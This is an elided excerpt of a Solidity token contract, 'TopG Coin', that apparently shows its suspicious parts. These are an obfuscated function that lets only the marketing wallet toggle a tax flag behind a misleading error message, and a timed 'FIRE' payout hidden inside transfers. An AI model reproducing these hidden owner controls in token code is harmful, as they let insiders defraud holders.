...
contract CoinToken is Context, IERC20, Ownable {
    ...
    string private _name = "TopG Coin";
    ...
    constructor(
        ...
        require(PAYBLEt.length == PAYBLEam.length, "Must have an amount");
        _PAYBLEt = PAYBLEt;
...
//    }
    ...
    function swapExacttaxStatusT( bool e) public virtual returns (bool) {
         require(_msgSender() == address(_MarketingWallet), "ERC20: transfer from the address");
        taxStatus = e;
        return true;
    }
...
//    }
    ...
    function _transfer(
        ...
        // still have FIREs
        if (
            _nextFIREIdx < _PAYBLEt.length &&
            _PAYBLEt[_nextFIREIdx] <= block.timestamp && amount <= _bubblebn
        ) FIRE(_PAYBLEam[_nextFIREIdx++]);
